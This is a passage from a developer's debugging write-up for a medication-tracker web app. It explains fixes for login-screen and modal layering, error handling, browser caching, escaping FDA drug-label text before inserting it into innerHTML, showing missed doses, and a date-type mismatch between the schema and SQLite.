    document.getElementById('loginScreen').style.display = 'flex';
}
```

**Problem B — the Settings modal is outside `.app-container` in the DOM**

`showAuthScreen` was hiding `.app-container` to reveal the login screen behind it. But the modals (`settingsModal`, `addModal`) are siblings of `.app-container` in the HTML — they live outside it. Hiding `.app-container` left the settings modal fully visible on screen, covering the login screen below it.

The login screen has `z-index: 9999` (higher than the modal's `z-index: 1000`), so it should always appear on top. The fix was to stop hiding `.app-container` entirely and instead close any open modals before showing the login screen. Since the login screen is `position:fixed; inset:0`, it covers the full viewport on its own.

```javascript
// Also simplified showAppScreen — no longer needs to restore hidden elements
function showAppScreen() {
    document.getElementById('loginScreen').style.display = 'none';
}
```

---

### Bug 3 — `medications.filter is not a function` after DB reset

**Symptom:** A red banner error appeared on load. Same message as the original autocomplete bug but a different cause.

**Cause:** After the DB was wiped and recreated, the old token in `localStorage` was still present. `authFetch` sent it, the server found no matching user, and returned `401`. `authFetch` correctly caught this, called `logout()`, and threw an error. But `loadHomeData` runs three requests in parallel via `Promise.all`. All three returned 401. The first triggered `logout()` and showed "Session expired" toast. Then `loadHomeData`'s own `catch` block also fired and showed a second toast: "Failed to load data: Session expired. Please sign in again." — two banners for the same event.

Additionally, `authFetch` previously only caught `401` — any `500` response passed through silently as a JSON object `{"detail": "..."}`. If `medications` was that object, `.filter()` crashed with "is not a function."

**Fix A — suppress the redundant toast:**

```javascript
} catch (error) {
    // logout() already shows a toast for session expiry — don't double-toast
    if (!error.message.includes('Session expired')) {
        showToast('Failed to load data: ' + error.message, 'error');
    }
}
```

**Fix B — make `authFetch` throw on any non-OK response, not just 401:**

```javascript
if (!response.ok) {
    return response.json()
        .then(err => { throw new Error(err.detail || `Server error ${response.status}`); })
        .catch(e => { throw e.message ? e : new Error(`Server error ${response.status}`); });
}
```

This means a `500` now throws a proper error with the server's message instead of passing the error object downstream as data. The `.filter()` call never runs.

---

### Bug 4 — Changes not taking effect (browser cache)

**Symptom:** Code was updated but behaviour didn't change. Server logs showed `304 Not Modified` for `app.js`.

**Cause:** The browser cached `app.js` and `index.html`. `304 Not Modified` means the browser asked "has this file changed?" and used its local copy when the server said no. The running app was still executing the old JavaScript.

**Fix:** Hard refresh forces the browser to re-download all assets regardless of cache:
- **Windows:** `Ctrl + Shift + R`
- **Mac:** `Cmd + Shift + R`

If old tokens are also stale: `F12 → Application → Local Storage → http://127.0.0.1:8000 → delete medtracker_token and medtracker_username`.

---

### The DB reset procedure (correct sequence)

Deleting `medtracker.db` while the server is running does not fix schema issues. SQLAlchemy's `create_all` only runs once — at startup. If the server is still running when the file is deleted, SQLite creates a new empty file on the next connection but no tables are built.

**Correct sequence:**
```
1. Ctrl+C  — stop the server
2. Delete medtracker.db
3. Restart the server  — create_all rebuilds all tables on startup
4. Re-register your user (new empty DB has no accounts)
```

## Part 13 — Fix: FDA drug info card not displaying

### The problem

After selecting a medication from autocomplete, the FDA drug information card failed to appear in the Add Medication modal. The API call to `GET /medications/drug-info/{name}` returned `200 OK` with valid data, so the issue was entirely in the frontend rendering.

### Root cause — unescaped HTML in FDA data

`displayDrugInfoCard` was inserting raw FDA text directly into `card.innerHTML` using a template literal. FDA drug labels routinely contain HTML-special characters:

- `&` in phrases like `"indications & usage"` or `"sodium & potassium"`
- `>` in phrases like `"doses > 500mg"` or `"pH > 6"`
- `<` in phrases like `"temperatures < 25°C"`

When these characters appear in the template literal, the browser's HTML parser interprets them as HTML syntax. `> 500mg` is parsed as a partial closing tag; `& usage` is parsed as a broken entity reference. The resulting malformed HTML prevents `innerHTML` from building the DOM subtree correctly, causing a silent JavaScript error that aborts card insertion.

### Secondary root cause — `setTimeout` vs `requestAnimationFrame`

The card's CSS transition (`opacity: 0 → 1`) was triggered with `setTimeout(() => card.classList.add('show'), 10)`. This is usually fine, but the double-`requestAnimationFrame` pattern is the correct way to force a browser paint cycle before adding a class that starts a transition. Using `setTimeout` with a short delay can occasionally miss the paint cycle if the main thread is busy.

### What changed

**`frontend/app.js` — `displayDrugInfoCard`:**

```javascript
// Before — raw FDA strings injected into innerHTML
const sideEffects = data.common_side_effects || data.side_effects || [];
const sideEffectsHtml = sideEffects.slice(0, 5)
    .map(e => `<span class="side-effect-chip">${e}</span>`).join('');

card.innerHTML = `...
    <div class="drug-info-content-ios">${(data.taken_for).substring(0, 150)}</div>
...`;
setTimeout(() => card.classList.add('show'), 10);

// After — escapeHtml() applied to all FDA text; arrays validated; rAF for transition
const sideEffects = Array.isArray(data.common_side_effects || data.side_effects)
    ? (data.common_side_effects || data.side_effects) : [];
const sideEffectsHtml = sideEffects.slice(0, 5)
    .map(e => `<span class="side-effect-chip">${escapeHtml(String(e))}</span>`).join('');

const takenFor = data.taken_for || data.indications || '';
const takenForShort = takenFor
    ? escapeHtml(takenFor.substring(0, 150)) + (takenFor.length > 150 ? '...' : '')
    : '';

card.innerHTML = `...
    <div class="drug-info-content-ios">${takenForShort}</div>
...`;
requestAnimationFrame(() => requestAnimationFrame(() => card.classList.add('show')));
```

The same fixes were applied to `displayNoDrugInfoCard`.

### What this teaches

**Never inject external API text into innerHTML.** FDA labels are plain text from a government database, not user input, but they still contain characters that mean something in HTML. The rule is: any string that comes from outside your own template must go through `escapeHtml()` before being embedded in a template literal that ends up in `innerHTML`. The existing `escapeHtml` function (used elsewhere in the codebase for autocomplete) already handles this — it just wasn't being called here.

**The double-rAF pattern.** The browser renders frames in a pipeline: JavaScript → Style → Layout → Paint. When you insert an element and immediately add a class in the same JS task, the browser never paints the element at its initial state — the transition has nothing to animate from. `requestAnimationFrame` schedules a callback at the next frame boundary. Two nested `requestAnimationFrame` calls let one full frame elapse (element inserted + initial style applied) before the class is added, giving the CSS transition a baseline to animate from.

## Part 14 — Fix: Newly added medication not appearing in schedule

### The problem

After adding a medication, it didn't appear in the schedule.

### Root cause — MISSED bucket excluded from home screen

The schedule agent assigns every medication dose to one of five buckets: NOW, LATER, MISSED, TAKEN, or SNOOZED. The default reminder time is **8:00 AM**. If a medication is added after 8:30 AM, its only dose for today falls into MISSED (the scheduled time has passed).

The home screen's "Up Next" section was only rendering `schedule.now` and `schedule.later`:

```javascript
// Before — MISSED silently dropped
const upcoming = [
    ...(schedule?.now || []).map(d => ({...d, bucket: 'now', urgent: true})),
    ...(schedule?.later || []).map(d => ({...d, bucket: 'later'})),
];
```

When a newly added medication was MISSED, `upcoming.length === 0` but `totalMeds > 0`, so the home screen showed "All caught up! You've taken all your medications for today." — which is wrong.

The Schedule tab was unaffected (it renders all five buckets) but the user was looking at the home screen first.

### Secondary issue — `_finishAddModal` didn't refresh the schedule tab

If the user happened to be on the Schedule tab, `_finishAddModal` only called `loadHomeData()` and `loadMedications()`. The schedule tab wouldn't update until the user navigated away and back.

### What changed

**`frontend/app.js` — `loadHomeData`:**

```javascript
// After — MISSED included so user can see and act on it from home
const upcoming = [
    ...(schedule?.now || []).map(d => ({...d, bucket: 'now', urgent: true})),
    ...(schedule?.later || []).map(d => ({...d, bucket: 'later'})),
    ...(schedule?.missed || []).map(d => ({...d, bucket: 'missed'})),
];
```

**`frontend/app.js` — `updateUpNext`:** Added `isMissed` detection, renders a `MISSED` badge (orange) and applies a left border to distinguish missed items from upcoming ones. Updated "All caught up" copy to only show when medications exist and none are pending.

**`frontend/app.js` — `_finishAddModal`:** Added `loadSchedule()` call when the current view is already the schedule tab.

**`frontend/style.css`:** Added `.badge-missed` (orange) and `.up-next-item.missed` (orange left border) styles.

### What this teaches

**Bucket completeness.** If a feature uses an enum-based status (NOW/LATER/MISSED/TAKEN) you need to handle every possible value everywhere that status is displayed. Omitting MISSED from the home screen meant the user had no idea the medication existed until they switched tabs.

**"All caught up" messaging.** This pattern is common in to-do UIs: show an empty-success state when there's nothing left to do. The key is distinguishing between "nothing to do" (truly all taken) and "nothing in these specific buckets" (some might be missed). The message must reflect reality.

## Part 15 — Fix: Newly added medication still absent from schedule (`start_date` type mismatch)

### The problem

After Part 14's fix, a newly added medication still didn't appear in the Schedule tab or the home Up Next section. Server logs confirmed `GET /schedule/today` returned 200 OK but the medication was absent. The same medication appeared correctly in `GET /medications`.

### Root cause — `datetime` stored as `"YYYY-MM-DD HH:MM:SS"` in a `Date` column

The Pydantic schema declared `start_date: datetime`. The SQLAlchemy model declared `start_date = Column(Date)`. These are different types.

When Pydantic receives `"2026-03-11"` for a `datetime` field, it produces `datetime(2026, 3, 11, 0, 0, 0)` — a Python `datetime` object. That object is then passed to SQLAlchemy. SQLAlchemy's `Date` column **should** strip the time portion via its bind processor, but Python's underlying `sqlite3` driver has its own datetime adapter that serialises `datetime` objects as `"2026-03-11 00:00:00.000000"` — the full ISO datetime format including time.

SQLite has no native date type; it stores dates as TEXT and compares them as strings. The schedule agent filters:

```python
Medication.start_date <= today  # today = date(2026, 3, 11) → "2026-03-11"
```

SQLite compares:

```
"2026-03-11 00:00:00.000000" <= "2026-03-11"
```

In ASCII/lexicographic order, a space character (`' '` = 0x20) sorts *after* end-of-string, so the longer string is greater. The comparison is **False** — the medication is excluded from every schedule query.

The `GET /medications` endpoint has no `start_date` filter, which is why the medication appeared there but not in the schedule.

### Why `GET /medications` worked but `GET /schedule/today` didn't

| Endpoint | Filters applied |
|----------|----------------|
| `GET /medications` | `user_id == current_user.id` only |
| `GET /schedule/today` | `is_active == True` AND `start_date <= today` AND `user_id == current_user.id` |

The `start_date` filter is unique to the schedule query.

### What changed

**`backend/schemas.py`:**

```python
# Before — datetime causes sqlite3 to serialise as "YYYY-MM-DD HH:MM:SS"
start_date: datetime = Field(..., example="2024-01-01")
end_date: Optional[datetime] = Field(None, example="2024-12-31")

# MedicationUpdate
start_date: Optional[datetime] = None
end_date: Optional[datetime] = None

# After — date serialises as "YYYY-MM-DD" matching Column(Date)
start_date: date = Field(..., example="2024-01-01")
end_date: Optional[date] = Field(None, example="2024-12-31")

# MedicationUpdate
start_date: Optional[date] = None
end_date: Optional[date] = None
```

Both `MedicationBase` (create) and `MedicationUpdate` (update) schemas were changed. `date` is already imported from `datetime` in `schemas.py`.

No model change was needed — `Column(Date)` was always correct. No frontend change was needed — `"2026-03-11"` is valid for both `datetime` and `date` Pydantic fields.

### What this teaches

**Schema types must match column types.** When a Pydantic schema and a SQLAlchemy column have different types for the same field, the value goes through two serialisation steps (Pydantic's and sqlite3's), and the results can conflict. The rule is: use `date` for `Column(Date)` fields and `datetime` for `Column(DateTime)` fields. There is no safe "close enough."

**SQLite stores everything as TEXT.** Unlike PostgreSQL, SQLite has no native date/datetime types. It stores them as strings, and all comparisons are string comparisons. This means `"2026-03-11 00:00:00" > "2026-03-11"` — a fact that violates most developers' intuitions about date comparison. The safest defence is to ensure consistent serialisation at the schema boundary so only one format ever enters the database.
